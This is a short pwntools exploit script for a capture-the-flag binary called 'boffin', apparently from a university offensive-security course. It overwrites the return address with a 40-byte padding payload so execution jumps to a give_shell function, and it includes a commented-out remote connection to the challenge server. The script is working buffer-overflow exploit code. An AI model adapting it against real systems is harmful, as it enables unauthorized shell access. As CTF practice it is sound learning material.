import struct
from itertools import chain
from typing import Any, Iterable, List

from pwn import *

context.binary = './boffin'
context.terminal = ['tilix', '-e']

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: ['-ex', a], args))

breakpoints = [
    '&give_shell',
    # '0x4006fe',
    '0x40071a', # main RET
]

print_statements = [
]

breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

give_shell = 0x40069d # give_shell address
payload = b"A" * 40 + struct.pack("<Q", give_shell)

with process(['pwndbg', './boffin'] + commands) as p:
# with remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1337) as p:

    is_remote = isinstance(p, remote)

    if is_remote:
        print(p.recv())
        p.sendline(b'nf2137')

    if not is_remote:
        p.sendline(b'r')

    p.recvuntil(b"Hey! What's your name?")
    p.sendline(payload)
    p.interactive()
    
